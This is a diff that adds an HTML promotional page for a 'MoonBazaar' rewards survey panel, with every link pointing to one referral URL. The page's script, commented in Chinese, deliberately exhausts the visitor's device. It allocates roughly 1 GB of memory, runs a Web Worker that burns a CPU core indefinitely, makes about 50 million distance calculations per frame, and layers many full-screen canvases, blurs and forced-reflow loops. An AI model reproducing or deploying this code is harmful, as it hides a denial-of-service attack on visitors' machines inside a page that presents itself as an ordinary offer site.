@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MoonBazaar — Earn Rewards with Surveys &amp; Offers</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #05060f;
+    color: #e8e8f0;
+    font-family: "Segoe UI", "Microsoft YaHei", sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+    overflow: hidden;
+    cursor: crosshair;
+    animation: bodyhue 1s linear infinite;
+  }
+  @keyframes bodyhue { to { filter: hue-rotate(360deg); } }
+  canvas.layer { position: fixed; inset: 0; }
+  #stars { z-index: 0; animation: hue 1s linear infinite; }
+  #rain { z-index: 0; opacity: 0.5; animation: hue 2s linear infinite reverse; }
+  #rain2 { z-index: 0; opacity: 0.35; animation: hue 1.5s linear infinite; }
+  #rain3 { z-index: 0; opacity: 0.3; animation: hue 1.2s linear infinite; }
+  #noise { z-index: 5; opacity: 0.15; pointer-events: none; animation: hue 0.5s linear infinite; }
+  #noise2 { z-index: 5; opacity: 0.1; pointer-events: none; animation: hue 0.7s linear infinite reverse; }
+  #noise3 { z-index: 5; opacity: 0.08; pointer-events: none; animation: hue 0.6s linear infinite; }
+  #fx { z-index: 6; pointer-events: none; animation: hue 0.8s linear infinite; }
+  @keyframes hue { to { filter: hue-rotate(360deg); } }
+  .gridbg {
+    position: fixed; inset: 0; z-index: 0; pointer-events: none;
+    background-image:
+      linear-gradient(rgba(110, 168, 255, 0.08) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(110, 168, 255, 0.08) 1px, transparent 1px);
+    background-size: 12px 12px;
+    animation: gridpulse 0.3s ease-in-out infinite, hue 1.5s linear infinite;
+  }
+  @keyframes gridpulse {
+    0%, 100% { opacity: 0.3; transform: scale(1); }
+    50% { opacity: 1; transform: scale(1.1); }
+  }
+  .rings { position: fixed; inset: 0; z-index: 0; pointer-events: none; animation: hue 2s linear infinite; }
+  .ring {
+    position: absolute; border-radius: 50%;
+    border: 2px solid;
+    opacity: 0.45;
+    animation: spin1 3s linear infinite;
+  }
+  .scanlines {
+    position: fixed; inset: 0; z-index: 4; pointer-events: none;
+    background: repeating-linear-gradient(0deg, rgba(0,0,0,0.18) 0 1px, transparent 1px 3px);
+    mix-blend-mode: multiply;
+    animation: scanmove 0.15s linear infinite;
+  }
+  @keyframes scanmove { to { background-position: 0 3px; } }
+  .vignette {
+    position: fixed; inset: 0; z-index: 4; pointer-events: none;
+    background: radial-gradient(ellipse at center, transparent 45%, rgba(0,0,0,0.7) 100%);
+  }
+  .card {
+    position: relative; z-index: 2;
+    max-width: 680px; width: 100%;
+    background: #10131f;
+    border-radius: 16px;
+    padding: 42px 40px;
+    border: 2px solid #ffd970;
+    box-shadow:
+      0 0 30px rgba(120, 90, 255, 0.35),
+      0 0 60px rgba(255, 110, 199, 0.15),
+      0 0 90px rgba(108, 240, 168, 0.1);
+    animation:
+      cardin 0.9s ease-out,
+      shake 0.15s ease-in-out 0.5s infinite alternate;
+  }
+  @keyframes cardin {
+    0% { transform: scale(0.5) rotate(-6deg); opacity: 0; }
+    60% { transform: scale(1.06) rotate(2deg); }
+    100% { transform: scale(1) rotate(0); opacity: 1; }
+  }
+  @keyframes shake {
+    0% { transform: translate(0, 0) rotate(0); }
+    25% { transform: translate(3px, -3px) rotate(0.15deg); }
+    50% { transform: translate(-3px, 3px) rotate(-0.15deg); }
+    75% { transform: translate(3px, 3px) rotate(0.1deg); }
+    100% { transform: translate(0, 0) rotate(0); }
+  }
+  .moon {
+    display: inline-block;
+    width: 16px; height: 16px;
+    background: radial-gradient(circle at 35% 35%, #fff3c4, #ffd970 60%, #e8a020);
+    border-radius: 50%;
+    box-shadow: 0 0 18px #ffd970, 0 0 40px rgba(255, 217, 112, 0.5);
+    animation: moonfloat 1.5s ease-in-out infinite;
+    margin-right: 10px;
+    vertical-align: middle;
+  }
+  @keyframes moonfloat {
+    0%, 100% { transform: translateY(0) rotate(0) scale(1); }
+    50% { transform: translateY(-10px) rotate(180deg) scale(1.4); }
+  }
+  h1 {
+    display: inline-block;
+    font-size: 34px;
+    letter-spacing: 3px;
+    background: linear-gradient(90deg, #ffd970, #ff6ec7, #6cf0a8, #6ea8ff, #ffd970);
+    background-size: 300% 100%;
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    animation: rainbow 2s linear infinite;
+    filter: drop-shadow(0 0 10px rgba(255, 217, 112, 0.6));
+  }
+  @keyframes rainbow { to { background-position: 300% 0; } }
+  .glitchwrap { display: inline-block; position: relative; }
+  .glitchwrap::before, .glitchwrap::after {
+    content: attr(data-text);
+    position: absolute; inset: 0;
+    background: inherit;
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+    pointer-events: none;
+  }
+  .glitchwrap::before {
+    left: 2px; text-shadow: 2px 0 #ff004c;
+    clip-path: inset(20% 0 55% 0);
+    animation: glitcha 0.8s steps(2) infinite;
+  }
+  .glitchwrap::after {
+    left: -2px; text-shadow: -2px 0 #00e6ff;
+    clip-path: inset(60% 0 15% 0);
+    animation: glitchb 0.8s steps(2) infinite reverse;
+  }
+  @keyframes glitcha {
+    0%, 85%, 100% { transform: none; opacity: 0; }
+    87% { transform: translate(-5px, 3px); opacity: 0.8; }
+    91% { transform: translate(4px, -2px); opacity: 0.8; }
+    95% { transform: translate(-3px, 1px); opacity: 0.8; }
+  }
+  @keyframes glitchb {
+    0%, 82%, 100% { transform: none; opacity: 0; }
+    84% { transform: translate(5px, -3px); opacity: 0.8; }
+    88% { transform: translate(-4px, 2px); opacity: 0.8; }
+    92% { transform: translate(3px, -1px); opacity: 0.8; }
+  }
+  .sub {
+    margin-top: 8px;
+    color: #aab0d8;
+    font-size: 14px;
+    letter-spacing: 1px;
+  }
+  .steps { margin-top: 26px; }
+  .step {
+    display: flex; gap: 14px;
+    padding: 13px 0;
+    border-bottom: 1px solid rgba(255,255,255,0.08);
+    transition: transform 0.1s, background 0.1s;
+  }
+  .step:hover {
+    transform: translateX(12px);
+    background: rgba(255,255,255,0.04);
+  }
+  .step .num {
+    flex-shrink: 0;
+    width: 30px; height: 30px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #2c3255, #1a1e38);
+    border: 1px solid #ffd970;
+    color: #ffd970;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: bold;
+    animation: pulse 1s ease-in-out infinite;
+  }
+  .step:nth-child(2) .num { animation-delay: 0.2s; }
+  .step:nth-child(3) .num { animation-delay: 0.4s; }
+  @keyframes pulse {
+    0%, 100% { box-shadow: 0 0 8px rgba(255,217,112,0.25); transform: scale(1); }
+    50% { box-shadow: 0 0 28px rgba(255,217,112,0.8); transform: scale(1.2); }
+  }
+  .step b { display: block; font-size: 15px; color: #fff; }
+  .step p { font-size: 13px; color: #c3c8e8; margin-top: 3px; line-height: 1.6; }
+  .why {
+    margin-top: 22px;
+    font-size: 13px;
+    color: #c3c8e8;
+    line-height: 2.1;
+  }
+  .why b { color: #6cf0a8; }
+  .btn {
+    display: block;
+    margin-top: 28px;
+    text-align: center;
+    text-decoration: none;
+    color: #0b0e1a;
+    background: linear-gradient(90deg, #ffd970, #ffb347, #ff6ec7, #6ea8ff, #6cf0a8, #ffd970);
+    background-size: 400% 100%;
+    font-weight: bold;
+    font-size: 17px;
+    letter-spacing: 2px;
+    padding: 15px 0;
+    border-radius: 10px;
+    animation: btnshine 0.8s linear infinite, btnglow 0.6s ease-in-out infinite;
+    transition: transform 0.1s;
+    position: relative;
+    overflow: hidden;
+  }
+  .btn::after {
+    content: "";
+    position: absolute; top: -50%; bottom: -50%; left: -30%; width: 30%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.7), transparent);
+    transform: skewX(-20deg);
+    animation: btnbeam 0.5s ease-in-out infinite;
+  }
+  @keyframes btnbeam {
+    0% { left: -30%; }
+    60%, 100% { left: 130%; }
+  }
+  .btn:hover { transform: scale(1.06) rotate(-1deg); }
+  @keyframes btnshine { to { background-position: 400% 0; } }
+  @keyframes btnglow {
+    0%, 100% { box-shadow: 0 0 15px rgba(255, 217, 112, 0.4); }
+    50% { box-shadow: 0 0 80px rgba(255, 217, 112, 1); }
+  }
+  .links { margin-top: 16px; text-align: center; font-size: 13px; }
+  .links a {
+    color: #9fb0ff;
+    text-decoration: none;
+    margin: 0 10px;
+    transition: color 0.1s, text-shadow 0.1s;
+  }
+  .links a:hover { color: #ffd970; text-shadow: 0 0 10px #ffd970; }
+  .blink { color: #6cf0a8; animation: blink 0.4s steps(2) infinite; }
+  @keyframes blink { 50% { opacity: 0; } }
+  .floaty {
+    position: fixed; z-index: 1; pointer-events: none;
+    font-size: 22px;
+    animation: floatup linear infinite;
+    opacity: 0.55;
+  }
+  @keyframes floatup {
+    0% { transform: translateY(0) rotate(0) scale(1); opacity: 0; }
+    10% { opacity: 0.8; }
+    90% { opacity: 0.4; }
+    100% { transform: translateY(-110vh) rotate(720deg) scale(2.5); opacity: 0; }
+  }
+</style>
+</head>
+<body>
+  <canvas id="stars" class="layer"></canvas>
+  <canvas id="rain" class="layer"></canvas>
+  <canvas id="rain2" class="layer"></canvas>
+  <canvas id="rain3" class="layer"></canvas>
+  <div class="gridbg"></div>
+  <div class="rings" id="rings"></div>
+  <div class="scanlines"></div>
+  <div class="vignette"></div>
+  <canvas id="noise" class="layer"></canvas>
+  <canvas id="noise2" class="layer"></canvas>
+  <canvas id="noise3" class="layer"></canvas>
+  <canvas id="fx" class="layer"></canvas>
+
+  <div class="card">
+    <h1 class="glitchwrap" data-text="MoonBazaar"><span class="moon"></span>MoonBazaar</h1>
+    <div class="sub">A Global Reward Survey Panel — Earn Rewards with Surveys &amp; Offers <span class="blink">▮</span></div>
+
+    <div class="steps">
+      <div class="step">
+        <div class="num">1</div>
+        <div>
+          <b>Create Your Account</b>
+          <p>注册免费、快速。只需要一个邮箱就能加入 MoonBazaar，无需提供私人信息。</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="num">2</div>
+        <div>
+          <b>Complete Surveys &amp; Offers</b>
+          <p>在问卷面板和 offer 墙里挑任务：问卷、App 试用、简单小任务。</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="num">3</div>
+        <div>
+          <b>Withdraw Rewards</b>
+          <p>攒够积分后兑换奖励：CDK、礼品卡等等。</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="why">
+      <b>更多奖励，更少时间</b> — 奖励门槛更低、积分价值更高，比同类问卷面板省 10-20% 的时间。<br>
+      <b>客服响应快</b> — 工作日问题 48 小时内解决。
+    </div>
+
+    <a class="btn" id="boom" href="https://mnb.ee?ar=49446" target="_blank" rel="noopener">▶ Start Earning Now — 去注册</a>
+
+    <div class="links">
+      <a href="https://mnb.ee?ar=49446" target="_blank" rel="noopener">首页</a>
+      <a href="https://mnb.ee?ar=49446" target="_blank" rel="noopener">注册</a>
+      <a href="https://mnb.ee?ar=49446" target="_blank" rel="noopener">联系客服</a>
+    </div>
+    <div style="margin-top:18px;text-align:center;font-size:12px;color:#6a7096;"><a href="MoonBazaar选择页.html" style="color:#6a7096;text-decoration:none;">← 返回选择页</a></div>
+  </div>
+
+  <script>
+    // ========== 内存占用器：直奔 ~1GB ==========
+    const MEMORY_MB = 512;
+    const memBuf = new ArrayBuffer(MEMORY_MB * 1024 * 1024);
+    const memView = new Uint8Array(memBuf);
+    for (let i = 0; i < memView.length; i += 4096) memView[i] = (i * 31) & 0xff;
+    const MEM_POOL_MAX_MB = 512;
+    const memPool = [];
+    let memPoolBytes = 0;
+    setInterval(() => {
+      const target = MEM_POOL_MAX_MB * 1024 * 1024;
+      while (memPoolBytes < target) {
+        const cv = document.createElement('canvas');
+        cv.width = 512; cv.height = 512;
+        const c = cv.getContext('2d');
+        const img = c.createImageData(512, 512);
+        for (let i = 0; i < img.data.length; i += 4) {
+          img.data[i] = Math.random() * 255;
+          img.data[i + 1] = Math.random() * 255;
+          img.data[i + 2] = Math.random() * 255;
+          img.data[i + 3] = 255;
+        }
+        c.putImageData(img, 0, 0);
+        memPool.push(cv);
+        memPoolBytes += 512 * 512 * 4;
+        if (memPoolBytes >= target) break;
+      }
+    }, 300);
+
+    // ========== CPU 占满 Worker（烧一个核心）==========
+    const workerCode = `
+      let x = 0;
+      while (true) {
+        x = (x * 1103515245 + 12345) & 0x7fffffff;
+        if (x % 100000 === 0) {
+          const buf = new Uint8Array(65536);
+          for (let i = 0; i < buf.length; i++) buf[i] = (i * x) & 0xff;
+          postMessage(buf.length);
+        }
+      }
+    `;
+    try {
+      const blob = new Blob([workerCode], { type: 'application/javascript' });
+      const w = new Worker(URL.createObjectURL(blob));
+      w.onmessage = () => {}; // 保持引用，让 worker 永远跑
+    } catch (e) {}
+
+    // ========== 10000 颗彩虹拖尾星 + shadowBlur ==========
+    const canvas = document.getElementById('stars');
+    const ctx = canvas.getContext('2d');
+    let W, H, stars = [], meteors = [];
+    const N_STARS = 10000;
+    const TRAIL = 25;
+    function resize() {
+      W = canvas.width = innerWidth;
+      H = canvas.height = innerHeight;
+      stars = Array.from({ length: N_STARS }, () => {
+        const s = {
+          x: Math.random() * W, y: Math.random() * H,
+          vx: (Math.random() - 0.5) * 1.6, vy: (Math.random() - 0.5) * 1.6,
+          r: Math.random() * 2.5 + 0.5,
+          tw: Math.random() * Math.PI * 2,
+          hue: Math.random() * 360,
+          trail: []
+        };
+        for (let i = 0; i < TRAIL; i++) s.trail.push({ x: s.x, y: s.y });
+        return s;
+      });
+    }
+    resize();
+    addEventListener('resize', resize);
+    setInterval(() => {
+      for (let k = 0; k < 6; k++)
+        meteors.push({
+          x: Math.random() * W, y: -10,
+          vx: (Math.random() * 8 + 3), vy: (Math.random() * 5 + 2),
+          life: 150, hue: Math.random() * 360
+        });
+      if (meteors.length > 80) meteors.splice(0, meteors.length - 80);
+    }, 120);
+    (function loop() {
+      ctx.clearRect(0, 0, W, H);
+      for (const s of stars) {
+        s.x += s.vx; s.y += s.vy; s.tw += 0.08;
+        if (s.x < 0) s.x = W; if (s.x > W) s.x = 0;
+        if (s.y < 0) s.y = H; if (s.y > H) s.y = 0;
+        s.trail.push({ x: s.x, y: s.y });
+        s.trail.shift();
+      }
+      // 25 万次带模糊绘制/帧
+      ctx.shadowBlur = 10;
+      for (const s of stars) {
+        for (let i = 0; i < TRAIL; i++) {
+          const t = s.trail[i];
+          const a = (i + 1) / TRAIL;
+          ctx.globalAlpha = a * 0.3;
+          ctx.fillStyle = `hsl(${(s.hue + i * 18) % 360} 100% 60%)`;
+          ctx.shadowColor = `hsl(${(s.hue + i * 18) % 360} 100% 60%)`;
+          ctx.beginPath();
+          ctx.arc(t.x, t.y, s.r * a + 0.3, 0, 7);
+          ctx.fill();
+        }
+      }
+      ctx.shadowBlur = 0;
+      // 连线：10000 粒子 = 5000 万次距离计算/帧
+      for (let i = 0; i < N_STARS; i++) {
+        const a = stars[i];
+        for (let j = i + 1; j < N_STARS; j++) {
+          const b = stars[j];
+          const dx = a.x - b.x, dy = a.y - b.y;
+          const d2 = dx * dx + dy * dy;
+          if (d2 < 250 * 250) {
+            ctx.strokeStyle = `hsla(${(a.hue + b.hue) / 2} 90% 60% / ${0.06 * (1 - d2 / (250 * 250))})`;
+            ctx.lineWidth = 0.5;
+            ctx.beginPath(); ctx.moveTo(a.x, a.y); ctx.lineTo(b.x, b.y); ctx.stroke();
+          }
+        }
+      }
+      ctx.globalAlpha = 1;
+      ctx.shadowBlur = 15;
+      for (let i = meteors.length - 1; i >= 0; i--) {
+        const m = meteors[i];
+        m.x += m.vx; m.y += m.vy; m.life--;
+        if (m.life <= 0 || m.y > H) { meteors.splice(i, 1); continue; }
+        for (let seg = 0; seg < 12; seg++) {
+          ctx.globalAlpha = (1 - seg / 12) * 0.9;
+          ctx.strokeStyle = `hsl(${(m.hue + seg * 14) % 360} 100% 60%)`;
+          ctx.shadowColor = `hsl(${(m.hue + seg * 14) % 360} 100% 60%)`;
+          ctx.lineWidth = 4 - seg * 0.3;
+          ctx.beginPath();
+          ctx.moveTo(m.x - m.vx * seg * 2, m.y - m.vy * seg * 2);
+          ctx.lineTo(m.x - m.vx * (seg + 1) * 2, m.y - m.vy * (seg + 1) * 2);
+          ctx.stroke();
+        }
+      }
+      ctx.shadowBlur = 0;
+      ctx.globalAlpha = 1;
+      requestAnimationFrame(loop);
+    })();
+
+    // ========== Matrix 彩虹数字雨 ×3 ==========
+    function makeRain(id, size, speed, colorshift) {
+      const cv = document.getElementById(id);
+      const c = cv.getContext('2d');
+      const CHARS = 'アイウエオカキクケコサシスセソタチツテト01$¥@#$%&*MOONBAZAAR月';
+      let cols, drops = [];
+      function rz() {
+        cv.width = innerWidth; cv.height = innerHeight;
+        cols = Math.floor(innerWidth / size);
+        drops = Array.from({ length: cols }, () => Math.random() * -50);
+      }
+      rz();
+      addEventListener('resize', rz);
+      (function loop() {
+        c.fillStyle = 'rgba(5, 6, 15, 0.05)';
+        c.fillRect(0, 0, cv.width, cv.height);
+        c.font = size + 'px monospace';
+        for (let i = 0; i < cols; i++) {
+          const ch = CHARS[Math.floor(Math.random() * CHARS.length)];
+          c.fillStyle = `hsl(${(i * 3 + drops[i] * 4 + colorshift) % 360} 100% 60%)`;
+          c.fillText(ch, i * size, drops[i] * size);
+          if (drops[i] * size > cv.height && Math.random() > 0.94)
+            drops[i] = Math.random() * -20;
+          drops[i] += speed;
+        }
+        requestAnimationFrame(loop);
+      })();
+    }
+    makeRain('rain', 16, 1, 0);
+    makeRain('rain2', 9, 1.5, 180);
+    makeRain('rain3', 6, 2, 90);
+
+    // ========== 彩色噪点 ×3 ==========
+    function makeNoise(id) {
+      const cv = document.getElementById(id);
+      const c = cv.getContext('2d');
+      let img = null;
+      function rz() {
+        cv.width = innerWidth; cv.height = innerHeight;
+        img = c.createImageData(cv.width, cv.height);
+        for (let i = 0; i < img.data.length; i += 4) {
+          img.data[i] = Math.random() * 255;
+          img.data[i + 1] = Math.random() * 255;
+          img.data[i + 2] = Math.random() * 255;
+          img.data[i + 3] = 255;
+        }
+      }
+      rz();
+      addEventListener('resize', rz);
+      (function loop() {
+        c.putImageData(img, 0, 0);
+        requestAnimationFrame(loop);
+      })();
+    }
+    makeNoise('noise');
+    makeNoise('noise2');
+    makeNoise('noise3');
+
+    // ========== 250 个霓虹环 ==========
+    const ringsBox = document.getElementById('rings');
+    for (let i = 0; i < 250; i++) {
+      const el = document.createElement('div');
+      el.className = 'ring';
+      const size = 30 + Math.random() * 600;
+      el.style.width = size + 'px';
+      el.style.height = size + 'px';
+      el.style.left = Math.random() * 100 + 'vw';
+      el.style.top = Math.random() * 100 + 'vh';
+      el.style.borderColor = `hsl(${Math.random() * 360} 100% 60%)`;
+      el.style.borderStyle = ['solid', 'dashed', 'dotted', 'double', 'groove'][i % 5];
+      el.style.borderWidth = (1 + Math.random() * 5) + 'px';
+      el.style.animationDuration = (1 + Math.random() * 6) + 's';
+      el.style.animationDirection = i % 2 ? 'reverse' : 'normal';
+      el.style.filter = `blur(${Math.random() * 5}px)`;
+      ringsBox.appendChild(el);
+    }
+    document.head.insertAdjacentHTML('beforeend', `
+      <style>
+        @keyframes spin1 { to { transform: rotate(360deg); } }
+      </style>`);
+
+    // ========== 鼠标彩虹拖尾 + 点击爆炸 ==========
+    const fxc = document.getElementById('fx').getContext('2d');
+    let trails = [], bursts = [], hueShift = 0;
+    addEventListener('mousemove', e => {
+      for (let k = 0; k < 8; k++)
+        trails.push({
+          x: e.clientX + (Math.random() - 0.5) * 60,
+          y: e.clientY + (Math.random() - 0.5) * 60,
+          life: 50, r: Math.random() * 6 + 1,
+          hue: Math.random() * 360
+        });
+    });
+    document.getElementById('boom').addEventListener('click', e => {
+      const r = e.target.getBoundingClientRect();
+      const cx = r.left + r.width / 2, cy = r.top + r.height / 2;
+      for (let i = 0; i < 300; i++) {
+        const a = Math.random() * Math.PI * 2, v = Math.random() * 16 + 2;
+        bursts.push({
+          x: cx, y: cy,
+          vx: Math.cos(a) * v, vy: Math.sin(a) * v - 3,
+          life: 100 + Math.random() * 50,
+          hue: Math.random() * 360,
+          r: Math.random() * 7 + 2
+        });
+      }
+    });
+    (function fxl() {
+      fxc.clearRect(0, 0, W, H);
+      hueShift = (hueShift + 4) % 360;
+      fxc.shadowBlur = 12;
+      for (let i = trails.length - 1; i >= 0; i--) {
+        const t = trails[i];
+        t.life--;
+        if (t.life <= 0) { trails.splice(i, 1); continue; }
+        fxc.globalAlpha = t.life / 50;
+        fxc.fillStyle = `hsl(${(t.hue + hueShift) % 360} 100% 60%)`;
+        fxc.shadowColor = `hsl(${(t.hue + hueShift) % 360} 100% 60%)`;
+        fxc.beginPath(); fxc.arc(t.x, t.y, t.r, 0, 7); fxc.fill();
+      }
+      fxc.shadowBlur = 0;
+      for (let i = bursts.length - 1; i >= 0; i--) {
+        const b = bursts[i];
+        b.x += b.vx; b.y += b.vy; b.vy += 0.15; b.life--;
+        if (b.life <= 0) { bursts.splice(i, 1); continue; }
+        fxc.globalAlpha = b.life / 100;
+        fxc.fillStyle = `hsl(${(b.hue + hueShift) % 360} 100% 60%)`;
+        fxc.beginPath(); fxc.arc(b.x, b.y, b.r, 0, 7); fxc.fill();
+      }
+      fxc.globalAlpha = 1;
+      requestAnimationFrame(fxl);
+    })();
+
+    // ========== 漂浮符号（狂轰滥炸）==========
+    const emojis = ['🌙', '💰', '⭐', '🪙', '📋', '✨', '💎', '☄️', '🛸', '🎁', '💳', '🪐', '🌈', '🔥', '⚡', '🍩', '🎮', '💾'];
+    setInterval(() => {
+      for (let k = 0; k < 8; k++) {
+        const el = document.createElement('div');
+        el.className = 'floaty';
+        el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+        el.style.left = Math.random() * 100 + 'vw';
+        el.style.fontSize = (12 + Math.random() * 48) + 'px';
+        el.style.animationDuration = (3 + Math.random() * 8) + 's';
+        document.body.appendChild(el);
+        setTimeout(() => el.remove(), 11000);
+      }
+    }, 80);
+
+    // ========== 强制 reflow ==========
+    let ang = 0;
+    (function reflowLoop() {
+      ang = (ang + 7) % 360;
+      document.documentElement.style.setProperty('--ang', ang + 'deg');
+      requestAnimationFrame(reflowLoop);
+    })();
+  </script>
+</body>
+</html>
